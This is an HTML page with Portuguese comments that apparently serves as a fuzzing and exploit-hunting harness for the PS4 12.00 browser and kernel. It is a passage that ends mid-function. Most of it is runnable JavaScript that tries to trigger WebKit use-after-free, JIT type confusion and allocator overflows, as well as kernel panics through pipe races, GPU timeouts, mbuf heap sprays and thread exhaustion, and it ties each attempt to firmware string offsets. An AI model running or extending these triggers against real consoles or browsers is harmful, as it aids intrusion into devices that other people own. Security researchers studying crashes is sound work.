<!DOCTYPE html>
<html lang="pt-PT">
<head>
    <meta charset="UTF-8">
    <title>PS4 v12.00 KERNEL PIPE & GPU STRESS</title>
    
</head>
<body> 

    <div class="container">
        <div class="panel">
            <h2 class="wk-header">WEBKIT</h2>
            <button onclick="runTest202()">202. SVG Matrix Transform UAF</button>
            <button onclick="runTest203()">203. VM Multi-Thread Registry Crash</button>
            <button onclick="runTest204()">204. Allocator Size Overflow Trap</button>
            <button onclick="runTest208()">208. Multi-Thread Registry Crash (0x2c19a0e)</button>
            <button onclick="runTest209()">209. Allocator Integer Overflow (0x2dad419)</button>
            <button onclick="runTest210()">210. SVG KernelMatrix Corruption (0x2cbc51e)</button>
            <button onclick="runTest214()">214. Map Iterator JIT Confusion</button>
            <button onclick="runTest215()">215. Canvas Restore State UAF</button>
            <button onclick="runTest216()">216. Blob URL Revoke Race</button>
            <button onclick="runTest220()">220. TypedArray Constructor Species Race</button>
            <button onclick="runTest221()">221. DOM Node Iterator Filter UAF</button>
            <button onclick="runTest222()">222. RegExp Match Global State Confusion</button>
<button onclick="runTest226()">226. StructuredClone Stack Smash</button>
<button onclick="runTest227()">227. Intl.Collator Getter Side-Effect</button>
<button onclick="runTest228()">228. AudioWorklet Module Lifetime Race</button>
<button onclick="runTest232()">232. DataChannel BinaryType UAF (0x2d140f2)</button>
<button onclick="runTest233()">233. WASM Proxy Import Crash</button>
<button onclick="runTest234()">234. JSC Array Butterfly Transition Panic</button>
<button onclick="runTest238()">238. WeakMap Ephemeron Mark Race</button>
<button onclick="runTest239()">239. JIT OSR Entry Type Confusion</button>
<button onclick="runTest240()">240. RegExp Search String Overflow</button>
<button onclick="runTest244()">244. Dynamic Import Module Race (0x2e15d)</button>
<button onclick="runTest245()">245. JS Parser Stack Overflow (0x2d04eed)</button>
<button onclick="runTest246()">246. ImageBitmap Thread Violation (0x2c19a0e)</button>
<button onclick="runTest250()">250. FontFaceSet Iterator Invalidation UAF</button>
<button onclick="runTest251()">251. DOMParser Recursive Stack Exhaustion</button>
<button onclick="runTest252()">252. ArrayBuffer Non-Power-of-2 Allocator Stress</button>
<button onclick="runTest256()">256. TreeWalker Node Removal UAF</button>
<button onclick="runTest257()">257. Regex ReDoS Stack Overflow</button>
<button onclick="runTest258()">258. String Repeat Integer Overflow</button>
<button onclick="runTest262()">262. JSON Parser Recursive Stack Smash</button>
<button onclick="runTest263()">263. NodeIterator Removal UAF</button>
<button onclick="runTest264()">264. String Concatenation Overflow</button>
<button onclick="runTest268()">268. XMLSerializer Recursive Stack Smash</button>
<button onclick="runTest269()">269. Intl.NumberFormat Locale Heap Corruption</button>
<button onclick="runTest270()">270. Body Replacement TreeWalker UAF</button>
<button onclick="runTest274()">274. Array Concat Spreadable Overflow (0x2dad419)</button>
<button onclick="runTest275()">275. DOMNodeRemoved Event UAF (C++ Binding)</button>
<button onclick="runTest276()">276. RegExp Recursion Stack Exhaustion (grammar-error)</button>
<button onclick="runTest280()">280. String PadEnd Integer Overflow (0x2dad419)</button>
<button onclick="runTest281()">281. Recursive Event Dispatch Stack Smash</button>
<button onclick="runTest282()">282. Detached Iframe Window Proxy UAF</button>
<button onclick="runTest286()">286. History State Serializer Stack Smash</button>
<button onclick="runTest287()">287. DOM Range ExtractContents UAF</button>
<button onclick="runTest288()">288. String Replace Exponential Overflow (0x2dad419)</button>
<button onclick="runTest292()">292. Sort Comparator Mutation UAF</button>
<button onclick="runTest293()">293. ContentEditable Selection Crash</button>
<button onclick="runTest294()">294. Array Unshift Allocator Overflow (0x2dad419)</button>
<button onclick="runTest298()">298. Array Flat Recursion Stack Smash</button>
<button onclick="runTest299()">299. Intl.DateTimeFormat Type Confusion</button>
<button onclick="runTest300()">300. XHR ResponseType State Machine Race</button>
<button onclick="runTest304()">304. Proxy Prototype Deep Recursion Smash</button>
<button onclick="runTest305()">305. Map Iterator Clearance UAF</button>
<button onclick="runTest306()">306. RegExp Sticky LastIndex Overflow</button>
<button onclick="runTest310()">310. TextEncoder Integer Overflow (0x2dad419)</button>
<button onclick="runTest311()">311. Selection API Range UAF</button>
<button onclick="runTest312()">312. Deeply Nested Iframe History Smash</button>
<button onclick="runTest316()">316. Recursive Nested Fullscreen Stack Smash</button>
<button onclick="runTest317()">317. Detached Iframe Fullscreen UAF</button>
<button onclick="runTest318()">318. Video Element Fullscreen Source Race</button>
<button onclick="runTest322()">322. SVG Use-Element Fullscreen Mutation UAF</button>
<button onclick="runTest323()">323. ShadowDOM Host Removal Fullscreen Race</button>
<button onclick="runTest324()">324. History PushState Fullscreen Desync</button>
<button onclick="runTest328()">328. Video Track Mutation UAF (Click Me)</button>
<button onclick="runTest329()">329. Input Focus Controller Race (Click Me)</button>
<button onclick="runTest330()">330. Canvas BackingStore Resize Overflow (Click Me)</button>



        </div>

        <div class="panel">
            <h2 class="kr-header">KERNEL</h2>
            <button onclick="runTest205()">205. Pipe Active List UAF (0xb0f609)</button>
            <button onclick="runTest206()">206. Mutex Uninitialized Race (0xb13238)</button>
            <button onclick="runTest207()">207. GPU Idle Timeout Panic (0x1281465)</button>
            <button onclick="runTest211()">211. Pipe Active List UAF (0xb0f609)</button>
            <button onclick="runTest212()">212. Thread Elem Alloc Fail (0xb12610)</button>
            <button onclick="runTest213()">213. GPU Idle Race Panic (0x1281465)</button>
            <button onclick="runTest217()">217. IP Fragment Reassembly Heap Spray</button>
            <button onclick="runTest218()">218. GPU Index Range Integer Overflow</button>
            <button onclick="runTest219()">219. UMTX Priority Inheritance Corruption</button>
            <button onclick="runTest223()">223. UMTX OP_WAIT Deadlock Fuzzing</button>
            <button onclick="runTest224()">224. Socket Sendfile UAF Race</button>
            <button onclick="runTest225()">225. GPU Command Buffer Fence Race</button>
<button onclick="runTest229()">229. CPU Scheduler Affinity Stress (0x3a7b7)</button>
<button onclick="runTest230()">230. Blob Vnode Reference Leak</button>
<button onclick="runTest231()">231. GPU Transform Feedback Interleaved OOB</button>
<button onclick="runTest235()">235. Buffer Cache 'tbp->b_bcount' Panic (0xb18caa)</button>
<button onclick="runTest236()">236. RTLD Module Unload Race (0x3f...)</button>
<button onclick="runTest237()">237. GPU Deleted Buffer Draw Race</button>
<button onclick="runTest241()">241. MADV_FREE Page Reclaim Race</button>
<button onclick="runTest242()">242. Scheduler CPU Affinity Flood (0x3a7b7)</button>
<button onclick="runTest243()">243. GPU Compute Thread Group Overflow</button>
<button onclick="runTest247()">247. Scheduler CPU Affinity Flood (0x3a7b7)</button>
<button onclick="runTest248()">248. Malloc Alignment Panic (__asan trace)</button>
<button onclick="runTest249()">249. Gamepad Sensor Init Race (0xb00a42)</button>
<button onclick="runTest253()">253. VFS Buffer Cache Misalign Panic (0xb18caa)</button>
<button onclick="runTest254()">254. 'luke_mthread_elem' Alloc Exhaustion (0xb12610)</button>
<button onclick="runTest255()">255. RWLock Reader-Writer Upgrade Deadlock (0x3a72c)</button>
<button onclick="runTest259()">259. VFS FileReader Slice Panic</button>
<button onclick="runTest260()">260. Worker Thread Spawn Flood</button>
<button onclick="runTest261()">261. XHR Payload Heap Fragmentation</button>
<button onclick="runTest265()">265. VFS Buffer Cache Misalign (0xb18caa)</button>
<button onclick="runTest266()">266. Kernel Thread Table Exhaustion (0xb12610)</button>
<button onclick="runTest267()">267. IPC Pipe Close Race (0xb0f609)</button>
<button onclick="runTest271()">271. Kqueue Event Handler Exhaustion</button>
<button onclick="runTest272()">272. Synchronous XHR Blob Race</button>
<button onclick="runTest273()">273. Network Mbuf Heap Fragmentation</button>
<button onclick="runTest277()">277. IPC Pipe Buffer Active List Race (0xb0f609)</button>
<button onclick="runTest278()">278. Thread Structure Exhaustion (0xb12610)</button>
<button onclick="runTest279()">279. VFS Blob Slice Alignment Panic (0xb18caa)</button>
<button onclick="runTest283()">283. MessageChannel Port Transfer Race (0xb0f609)</button>
<button onclick="runTest284()">284. File Descriptor Table Exhaustion (open/close)</button>
<button onclick="runTest285()">285. Blob URL Vnode Locking Race (0xb18caa)</button>
<button onclick="runTest289()">289. Socket Mbuf Cluster Heap Spray</button>
<button onclick="runTest290()">290. Recursive Worker Thread Exhaustion (0xb12610)</button>
<button onclick="runTest291()">291. VFS Pathname Lookup Buffer Overflow (0xb18caa)</button>
<button onclick="runTest295()">295. VFS Deep Path Lookup Panic (0xb18caa)</button>
<button onclick="runTest296()">296. Mthread Element Exhaustion (0xb12610)</button>
<button onclick="runTest297()">297. IPC Message Pipe Race (0xb0f609)</button>
<button onclick="runTest301()">301. Pipe Port Transfer Termination Race (0xb0f609)</button>
<button onclick="runTest302()">302. VFS Blob URL Revocation Race (0xb18caa)</button>
<button onclick="runTest303()">303. Recursive Worker Stack Guard Smash (0xb12610)</button> 
<button onclick="runTest307()">307. Kqueue Timer Callout Exhaustion (0xb12610)</button>
<button onclick="runTest308()">308. Mbuf Cluster Localhost Spray (Network Stack)</button>
<button onclick="runTest309()">309. VFS Slice Overlap Read Panic (0xb18caa)</button>
<button onclick="runTest313()">313. VFS Blob Reader/Revoke Lock Race (0xb18caa)</button>
<button onclick="runTest314()">314. MessagePort Transfer Zombie Worker (0xb0f609)</button>
<button onclick="runTest315()">315. Thread Signal Stack Exhaustion (0xb12610)</button>
<button onclick="runTest319()">319. Surface Compositor Toggle Thrashing</button>
<button onclick="runTest320()">320. Fullscreen Resize Event Thread Starvation</button>
<button onclick="runTest321()">321. Fullscreen IPC Pipe Flood Race (0xb0f609)</button>
<button onclick="runTest325()">325. Fullscreen VFS Buffer Misalign (0xb18caa)</button>
<button onclick="runTest326()">326. Fullscreen Thread Context Exhaustion (0xb12610)</button>
<button onclick="runTest327()">327. Fullscreen IPC Pipe Active List Race (0xb0f609)</button>
<button onclick="runTest331()">331. Fullscreen VFS Blob Lock Storm (0xb18caa)</button>
<button onclick="runTest332()">332. Scheduler CPU Affinity Switch Panic (0x3a7b7)</button>
<button onclick="runTest333()">333. Fullscreen IPC Active Pipe Race (0xb0f609)</button>



        </div>

        <div id="console"></div>
    </div>

    <script>
        function log(msg) {
            const el = document.getElementById('console');
            const d = document.createElement('div');
            d.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
            el.appendChild(d);
            el.scrollTop = el.scrollHeight;
        }

        // ==========================================
        //        WEBKIT VECTORS (202-204)
        // ==========================================

        // 202. SVG Matrix Transform UAF
        // Baseado em: Strings "kernelMatrix" (1200_libSceNKWebKit.sprx.elf.json).
        // Matrizes SVG são objectos complexos no WebKit. Remover o elemento SVG do DOM
        // enquanto um cálculo de matriz está pendente pode causar Use-After-Free.
        function runTest202() {
            log("202. Injecting: SVG Matrix UAF...");
            
            const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
            const rect = document.createElementNS("http://www.w3.org/2000/svg", "rect");
            svg.appendChild(rect);
            document.body.appendChild(svg);
            
            const matrix = svg.createSVGMatrix();
            
            // Define um getter malicioso que remove o SVG quando a propriedade 'a' da matriz é lida
            const point = svg.createSVGPoint();
            Object.defineProperty(point, 'x', {
                get: () => {
                    document.body.removeChild(svg); // Destroy SVG context
                    // Força GC para limpar a memória do SVG
                    let junk = new ArrayBuffer(1024*1024);
                    return 10;
                }
            });

            try {
                // A transformação usa 'point.x'. Se o código C++ não segurar uma referência forte,
                // o SVG é destruído no meio do cálculo.
                point.matrixTransform(matrix);
                log("Matrix transform executed with DOM mutation.");
            } catch(e) { log("Safe: " + e); }
        }

        // 203. VM Multi-Thread Registry Crash
        // Baseado em: "CRASH() when more than one threads are registered" (Offset 0x2c19a0e).
        // Tenta registrar múltiplos Workers na mesma VM ou contexto partilhado de forma ilegal.
        // Transferir ImageBitmap entre workers pode causar confusão de registo de thread.
        function runTest203() {
            log("203. Injecting: VM Thread Registry Crash...");
            
            // Cria um ImageBitmap (recurso gráfico que segura referências à thread)
            const canvas = document.createElement('canvas');
            createImageBitmap(canvas).then(bmp => {
                const w1 = new Worker(URL.createObjectURL(new Blob(['onmessage=e=>{postMessage(e.data, [e.data])}'], {type:'text/javascript'})));
                const w2 = new Worker(URL.createObjectURL(new Blob(['onmessage=e=>{postMessage("done")}'], {type:'text/javascript'})));
                
                // Transfere o bitmap para W1
                w1.postMessage(bmp, [bmp]);
                
                w1.onmessage = e => {
                    // W1 devolve. Agora tentamos passar para W2 MUITO rápido.
                    // O objectivo é que o WebKit pense que o recurso está em duas threads.
                    try {
                        w2.postMessage(e.data, [e.data]);
                    } catch(ex) {}
                };
            });
            log("Thread resource ping-pong initiated.");
        }

        // 204. Allocator Size Overflow Trap
        // Baseado em: "Cannot allocate a buffer of this size" (Offset 0x2dad419).
        // Tenta alocar um ArrayBuffer com tamanho próximo de MAX_SAFE_INTEGER ou -1 (via underflow).
        // Visa atingir o caminho de código que gera esse erro específico, testando a robustez do check.
        function runTest204() {
            log("204. Injecting: Allocator Size Trap...");
            
            const sizes = [
                0xFFFFFFFF, // Max UInt32
                2147483647, // Max Int32
                2147483648, // Int32 Overflow
                Number.MAX_SAFE_INTEGER
            ];
            
            sizes.forEach(s => {
                try {
                    // Tenta alocação direta. Se falhar no check JS, ok.
                    // Se passar para o C++ e falhar lá, pode corromper o heap se o tamanho for truncado.
                    let ab = new ArrayBuffer(s);
                    log(`Allocated size: ${s} (Unexpected!)`);
                } catch(e) { 
                    // Log silencioso, esperado
                }
            });
            log("Allocation boundary stress test done.");
        }

        // ==========================================
        //        KERNEL VECTORS (205-207)
        // ==========================================

        // 205. Pipe Active List UAF
        // Baseado em: "free pipe (%x) active list" (Offset 0xb0f609 no 1200.elf).
        // Pipes (MessageChannels) são recursos do Kernel. Se fecharmos uma porta enquanto
        // enviamos dados massivos, podemos disparar uma race na "active list" do kernel.
        function runTest205() {
            log("205. Injecting: Pipe Active List UAF...");
            
            // Cria muitos canais
            let channels = [];
            for(let i=0; i<100; i++) channels.push(new MessageChannel());
            
            const data = new Uint8Array(4096); // 4KB Page size
            
            // Loop de destruição caótica
            let i = setInterval(() => {
                let idx = Math.floor(Math.random() * channels.length);
                let mc = channels[idx];
                
                if(mc) {
                    // Envia dados (Kernel ativa o pipe)
                    try { mc.port1.postMessage(data); } catch(e){}
                    
                    // Fecha imediatamente (Kernel tenta libertar)
                    mc.port1.close();
                    mc.port2.close();
                    
                    // Remove da lista e substitui para reutilizar o descritor
                    channels[idx] = new MessageChannel();
                }
            }, 0);
            
            setTimeout(() => { clearInterval(i); log("Pipe fuzzing finished."); }, 2000);
        }

        // 206. Mutex Uninitialized Race
        // Baseado em: "mutex not initialized." (Offset 0xb13238).
        // Mutexes são usados em sockets para proteger opções.
        // Tenta chamar `setsockopt` (via WebRTC) em um objeto que está sendo criado.
        function runTest206() {
            log("206. Injecting: Uninitialized Mutex Race...");
            
            // Loop de criação rápida de conexões
            let i = setInterval(() => {
                // RTCPeerConnection inicializa muitos mutexes no kernel
                const pc = new RTCPeerConnection();
                
                // Tenta modificar propriedades imediatamente, antes da init completa
                try {
                    pc.createDataChannel("race");
                    // setConfiguration pode chamar setsockopt internamente
                    pc.setConfiguration({iceServers:[]}); 
                    pc.close();
                } catch(e) {}
            }, 1);
            
            setTimeout(() => { clearInterval(i); log("Mutex initialization race done."); }, 2000);
        }

        // 207. GPU Idle Timeout Panic
        // Baseado em: "GPU failed to become idle within 500 ms" (Offset 0x1281465).
        // Envia uma carga de trabalho gráfica impossível de terminar em 500ms e depois mata o contexto.
        // O kernel tentará resetar a GPU, o que é um caminho de código instável.
        function runTest207() {
            log("207. Injecting: GPU Idle Timeout Panic...");
            
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl');
            
            const ext = gl.getExtension('WEBGL_lose_context');
            
            // Shader extremamente pesado (Loop infinito simulado)
            const fs = gl.createShader(gl.FRAGMENT_SHADER);
            const src = "precision highp float; void main() { float x=0.0; for(int i=0; i<999999; i++) x+=sin(float(i)); gl_FragColor=vec4(x); }";
            gl.shaderSource(fs, src);
            gl.compileShader(fs);
            
            const p = gl.createProgram();
            const vs = gl.createShader(gl.VERTEX_SHADER);
            gl.shaderSource(vs, "void main(){gl_Position=vec4(0,0,0,1);}");
            gl.compileShader(vs);
            gl.attachShader(p, vs); gl.attachShader(p, fs); gl.linkProgram(p); gl.useProgram(p);
            
            // Envia o comando pesado
            gl.drawArrays(gl.POINTS, 0, 1);
            
            // Tenta destruir o contexto imediatamente, enquanto a GPU está ocupada (Busy)
            // O Kernel vai esperar 500ms e então entrar em pânico se a GPU não responder.
            setTimeout(() => {
                if(ext) ext.loseContext();
                log("Context lost while GPU busy.");
            }, 10);
        }
       //        WEBKIT VECTORS (208-210)
        // ==========================================

        // 208. Multi-Thread Registry Crash
        // Alvo: "CRASH() when more than one threads are registered"
        // Tenta registrar o mesmo contexto WebGL em múltiplos OffscreenCanvas controlados por Workers diferentes.
        // O WebKit deve impedir isso, mas uma race condition pode burlar a verificação.
        function runTest208() {
            log("208. Injecting: Thread Registry Race...");
            
            const canvas = document.createElement('canvas');
            // TransferControlToOffscreen "destaca" o canvas do DOM
            const offscreen = canvas.transferControlToOffscreen();
            
            const w1 = new Worker(URL.createObjectURL(new Blob(['onmessage=e=>{let gl=e.data.getContext("webgl"); postMessage("ok")}'], {type:'text/javascript'})));
            const w2 = new Worker(URL.createObjectURL(new Blob(['onmessage=e=>{let gl=e.data.getContext("webgl")}'], {type:'text/javascript'})));
            
            // O truque: Clonar a referência do offscreen antes de transferir
            // Nota: OffscreenCanvas não é clonável por padrão, mas MessageChannel pode passar a referência.
            
            const mc = new MessageChannel();
            
            try {
                // Envia para W1
                w1.postMessage(offscreen, [offscreen]);
                
                // Tenta enviar "algo" para W2 que force o WebKit a checar o registro da thread
                // Como o Offscreen já foi, tentamos criar confusão com ImageBitmap do mesmo source
                createImageBitmap(canvas).then(bmp => {
                    w2.postMessage(bmp, [bmp]);
                }).catch(e => log("Bitmap catch: " + e));
                
                log("Thread context race initiated.");
            } catch(e) { log("Safe: " + e); }
        }

        // 209. Allocator Integer Overflow
        // Alvo: "Cannot allocate a buffer of this size"
        // Tenta alocar buffers com tamanhos calculados para causar overflow em verificações de 32-bit.
        // Ex: 0xFFFFFFFF + 1 = 0. Se o alocador checar (size > MAX), o overflow passa.
        function runTest209() {
            log("209. Injecting: Allocator Overflow...");
            
            // Tamanhos perigosos para arquitetura 32/64 bits mista (típica em browsers consoles)
            const targets = [
                4294967295, // Max Uint32
                4294967296, // Max Uint32 + 1
                2147483648  // Max Int32 + 1
            ];

            targets.forEach(size => {
                try {
                    // Tenta criar ArrayBuffer. Se o JS engine permitir mas o C++ alocar errado...
                    let ab = new ArrayBuffer(size);
                    log(`Allocated: ${size} (Unexpected!)`, "log-hit");
                } catch(e) {
                    // Ignora erros normais, estamos procurando o crash silencioso
                }
            });
            
            // Tenta via WebAssembly Memory (que tem limites diferentes)
            try {
                // 65536 pages = 4GB. Tenta alocar 4GB + 1 Page
                new WebAssembly.Memory({initial: 65537});
            } catch(e) {}
            
            log("Allocator stress test executed.");
        }

        // 210. SVG KernelMatrix Corruption
        // Alvo: "kernelMatrix" (Filtros SVG ConvolveMatrix)
        // O filtro feConvolveMatrix usa uma matriz de kernel. Se mudarmos o tamanho da matriz (order)
        // durante a renderização, podemos causar leitura fora dos limites no buffer de kernelMatrix.
        function runTest210() {
            log("210. Injecting: SVG KernelMatrix Corruption...");
            
            const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
            const filter = document.createElementNS("http://www.w3.org/2000/svg", "filter");
            const convolve = document.createElementNS("http://www.w3.org/2000/svg", "feConvolveMatrix");
            
            // Configuração inicial válida
            convolve.setAttribute("order", "3 3");
            convolve.setAttribute("kernelMatrix", "1 1 1 1 1 1 1 1 1");
            
            filter.appendChild(convolve);
            svg.appendChild(filter);
            document.body.appendChild(svg);
            
            // Trigger: Forçar layout e mudar 'order' para maior que 'kernelMatrix'
            setTimeout(() => {
                convolve.setAttribute("order", "10 10"); // Exige 100 números
                // Não atualizamos kernelMatrix. O driver pode ler memória vizinha.
                
                // Força reflow
                let bbox = svg.getBBox();
                document.body.removeChild(svg);
                log("SVG Matrix mismatch trigger sent.");
            }, 10);
        }

        // ==========================================
        //        KERNEL VECTORS (211-213)
        // ==========================================

        // 211. Pipe Active List UAF
        // Alvo: "free pipe (%x) active list"
        // Esta é a vulnerabilidade mais crítica encontrada.
        // MessageChannel usa Pipes. Se conseguirmos libertar (close) um pipe que está na "active list"
        // (sendo lido/escrito pelo kernel), causamos o pânico identificado no log.
        function runTest211() {
            log("211. Injecting: Pipe Active List UAF...", "log-hit");
            
            const activePipes = [];
            const payload = new Uint8Array(1024 * 64); // Encher o buffer do pipe
            
            // Cria pressão
            for(let i=0; i<50; i++) activePipes.push(new MessageChannel());
            
            let i = setInterval(() => {
                // Escolhe um pipe aleatório
                const target = activePipes[Math.floor(Math.random() * activePipes.length)];
                
                // Ação 1: Enviar dados (Coloca o pipe na Active List do Kernel)
                try { target.port1.postMessage(payload); } catch(e){}
                
                // Ação 2: Fechar imediatamente (Chama pipe_free)
                // Se o Kernel não remover da active list antes de libertar -> CRASH
                target.port1.close();
                target.port2.close();
                
                // Recria para manter pressão
                activePipes[Math.floor(Math.random() * activePipes.length)] = new MessageChannel();
                
            }, 0);
            
            setTimeout(() => { clearInterval(i); log("Pipe UAF sequence finished."); }, 3000);
        }

        // 212. Thread Elem Alloc Fail
        // Alvo: "%s: failed to allocate luke_mthread_elem"
        // Tenta exaurir o alocador de elementos de thread do kernel.
        // Criação e destruição massiva de Workers com grandes pilhas de chamadas.
        function runTest212() {
            log("212. Injecting: Thread Element Exhaustion...");
            
            const blob = new Blob([`
                // Recursão para consumir stack e metadados de thread
                function d(i) { if(i>0) d(i-1); else postMessage("d"); }
                d(1000);
            `], {type:'text/javascript'});
            const url = URL.createObjectURL(blob);
            
            let workers = [];
            
            let i = setInterval(() => {
                // Tenta criar até falhar
                try {
                    let w = new Worker(url);
                    workers.push(w);
                    
                    // Mantém apenas os últimos 50 vivos para forçar churn (aloca/desaloca)
                    if(workers.length > 50) workers.shift().terminate();
                } catch(e) {
                    // Se falhar a criação, atingimos o limite.
                    // Tentar mais uma vez força o kernel a lidar com o erro de alocação (o alvo do log)
                    log("Thread alloc limit hit. Retrying to force panic...", "log-hit");
                }
            }, 5);
            
            setTimeout(() => { clearInterval(i); workers.forEach(w=>w.terminate()); }, 4000);
        }

        // 213. GPU Idle Race Panic
        // Alvo: "GPU failed to become idle"
        // Envia uma sequência de comandos que mantém a GPU ocupada e tenta resetar o contexto.
        // O log indica que o kernel entra em pânico se o timeout de 500ms for atingido.
        function runTest213() {
            log("213. Injecting: GPU Idle Panic...", "log-hit");
            
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl');
            const ext = gl.getExtension('WEBGL_lose_context');
            
            // Shader "Pesado"
            const vs = gl.createShader(gl.VERTEX_SHADER);
            gl.shaderSource(vs, "void main(){gl_Position=vec4(0,0,0,1);}");
            gl.compileShader(vs);
            const fs = gl.createShader(gl.FRAGMENT_SHADER);
            // Loop longo para travar a GPU por > 500ms
            gl.shaderSource(fs, "precision highp float; void main(){float s=0.0; for(int i=0;i<1000000;i++)s+=sin(float(i)); gl_FragColor=vec4(s);}");
            gl.compileShader(fs);
            
            const p = gl.createProgram();
            gl.attachShader(p, vs); gl.attachShader(p, fs); gl.linkProgram(p); gl.useProgram(p);
            
            // Dispatch
            gl.drawArrays(gl.POINTS, 0, 1000); // 1000 pixels * 1M loops
            
            // Trigger: Forçar perda de contexto imediatamente
            // O Kernel tentará limpar os recursos da GPU enquanto ela ainda está executando o loop
            if(ext) {
                setTimeout(() => {
                    log("Forcing context loss on busy GPU...");
                    ext.loseContext();
                }, 10); // 10ms < 500ms timeout
            }
        }
       // 214. Map Iterator JIT Confusion
        // O JSC optimiza iterações em Maps. Se alterarmos o layout interno do Map
        // (deletando itens e adicionando novos) durante um loop optimizado,
        // o JIT pode usar offsets antigos para ler o novo armazenamento (Butterfly).
        function runTest214() {
            log("214. Injecting: Map Iterator JIT Confusion...");
            
            const map = new Map();
            for(let i=0; i<100; i++) map.set(i, i);

            function opt(m) {
                let sum = 0;
                for (const [k, v] of m) {
                    sum += v;
                    // Trigger: Mutação a meio do loop
                    if (k === 50) {
                        m.clear(); // Destrói o armazenamento
                        m.set("new", 1.1); // Cria novo armazenamento (layout diferente)
                    }
                }
                return sum;
            }

            // Treino
            for(let i=0; i<1000; i++) {
                let m = new Map();
                m.set(1, 1);
                opt(m);
            }

            try {
                opt(map);
                log("JIT Iterator executed with mutation.");
            } catch(e) { log("Safe: " + e); }
        }

        // 215. Canvas Restore State UAF
        // O Canvas 2D mantém uma pilha de estados (save/restore).
        // Se redimensionarmos o canvas (que limpa o contexto e liberta buffers)
        // enquanto a pilha tem referências a recursos antigos (ex: Patterns/Gradients),
        // o restore() subsequente pode tentar usar recursos libertados.
        function runTest215() {
            log("215. Injecting: Canvas State UAF...");
            
            const c = document.createElement('canvas');
            const ctx = c.getContext('2d');
            
            // Cria um padrão complexo (aloca memória)
            const p = ctx.createPattern(document.createElement('canvas'), 'repeat');
            
            // Empilha estados
            for(let i=0; i<20; i++) {
                ctx.fillStyle = p;
                ctx.save(); // Guarda referência ao padrão na stack
            }
            
            // Redimensiona (Limpa contexto e deve invalidar a stack, mas as vezes falha)
            c.width = 1000; 
            c.height = 1000;
            
            try {
                // Tenta restaurar estado que aponta para recursos do contexto anterior
                for(let i=0; i<20; i++) ctx.restore();
                
                // Tenta usar
                ctx.fillRect(0,0,10,10);
                log("Canvas restored after resize/free.");
            } catch(e) { log("Context safe: " + e); }
        }

        // 216. Blob URL Revoke Race
        // Tenta aceder a um Blob URL (fetch/img) numa thread enquanto
        // outra thread chama URL.revokeObjectURL().
        // Visa corromper o contador de referências do recurso Blob no processo WebKit.
        function runTest216() {
            log("216. Injecting: Blob Revoke Race...");
            
            const blob = new Blob(["A".repeat(1024*1024)]);
            const url = URL.createObjectURL(blob);
            
            const w = new Worker(URL.createObjectURL(new Blob([`
                onmessage = e => {
                    // Tenta aceder enquanto é revogado
                    fetch(e.data).then(r=>r.text()).catch(()=>{});
                }
            `], {type:'text/javascript'})));
            
            let i = setInterval(() => {
                w.postMessage(url);
                // Race: Revoga e recria referência
                URL.revokeObjectURL(url);
            }, 5);
            
            setTimeout(() => { clearInterval(i); log("Blob race finished."); }, 2000);
        }

        // ==========================================
        //        KERNEL VECTORS (217-219)
        // ==========================================

        // 217. IP Fragment Reassembly Heap Spray
        // Baseado em logs "mbuf".
        // Envia milhares de pacotes IP fragmentados (via WebRTC/SCTP) que nunca são completados.
        // Isso força o Kernel a alocar buffers (mbuf clusters) para segurar os fragmentos à espera do resto.
        // Esgota a memória do kernel e fragmenta o heap.
        function runTest217() {
            log("217. Injecting: IP Fragment Heap Spray...");
            
            const pc = new RTCPeerConnection();
            const dc = pc.createDataChannel("frag", {ordered: false, maxRetransmits: 0});
            
            pc.createOffer().then(o => pc.setLocalDescription(o));
            
            // Payload pequeno mas enviado como "início de mensagem grande"
            const chunk = new Uint8Array(1000);
            
            let i = setInterval(() => {
                try {
                    // Envia rajadas para encher a fila de remontagem do kernel
                    for(let k=0; k<50; k++) dc.send(chunk);
                } catch(e) {}
            }, 10);
            
            setTimeout(() => { 
                clearInterval(i); 
                pc.close(); // Cleanup massivo pode causar panic se houver corrupção
                log("Fragment spray complete."); 
            }, 3000);
        }

        // 218. GPU Index Range Integer Overflow
        // O método drawRangeElements() pede ao driver para validar índices num intervalo (start, end).
        // Se passarmos um intervalo que causa overflow (ex: end - start > MAX_UINT),
        // a validação do driver pode passar, mas a GPU lê memória OOB.
        function runTest218() {
            log("218. Injecting: GPU Index Range Overflow...");
            
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl2'); // Necessário para drawRangeElements
            if(!gl) return log("WebGL2 required.");
            
            const b = gl.createBuffer();
            gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, b);
            gl.bufferData(gl.ELEMENT_ARRAY_BUFFER, new Uint8Array(100), gl.STATIC_DRAW);
            
            const p = gl.createProgram(); // Dummy program setup
            const vs = gl.createShader(gl.VERTEX_SHADER); gl.shaderSource(vs, "#version 300 es\nvoid main(){gl_Position=vec4(0);}"); gl.compileShader(vs);
            const fs = gl.createShader(gl.FRAGMENT_SHADER); gl.shaderSource(fs, "#version 300 es\nprecision highp float; out vec4 c; void main(){c=vec4(1);}"); gl.compileShader(fs);
            gl.attachShader(p, vs); gl.attachShader(p, fs); gl.linkProgram(p); gl.useProgram(p);

            try {
                // start = 0, end = 4294967295 (Max Uint32)
                // Driver tenta calcular tamanho: (end - start + 1) * size. 
                // Se usar aritmética de 32 bits, isso vira 0.
                gl.drawRangeElements(gl.POINTS, 0, 4294967295, 10, gl.UNSIGNED_BYTE, 0);
                log("Range overflow command sent.");
            } catch(e) { log("Driver caught overflow: " + e); }
        }

        // 219. UMTX Priority Inheritance Corruption
        // Baseado em logs "wrlock error" (Kernel 1200.json).
        // Cria uma situação de inversão de prioridade usando Atomics (futex/umtx).
        // Thread A (Baixa) segura lock. Thread B (Alta) espera. Thread A morre.
        // O Kernel deve corrigir a herança de prioridade. Se falhar, corrompe a lista de threads.
        function runTest219() {
            log("219. Injecting: UMTX Priority Inheritance...");
            
            if(!window.SharedArrayBuffer) return log("No SAB.");
            const sab = new SharedArrayBuffer(4096);
            const i32 = new Int32Array(sab);
            
            // Thread A: Segura lock e morre
            const wA = new Worker(URL.createObjectURL(new Blob([`
                onmessage = e => {
                    let i = new Int32Array(e.data);
                    // Adquire lock (simulado, valor = 1)
                    Atomics.store(i, 0, 1);
                    // Morre sem libertar (termina worker)
                    close();
                }
            `], {type:'text/javascript'})));
            
            // Thread B: Espera pelo lock
            const wB = new Worker(URL.createObjectURL(new Blob([`
                onmessage = e => {
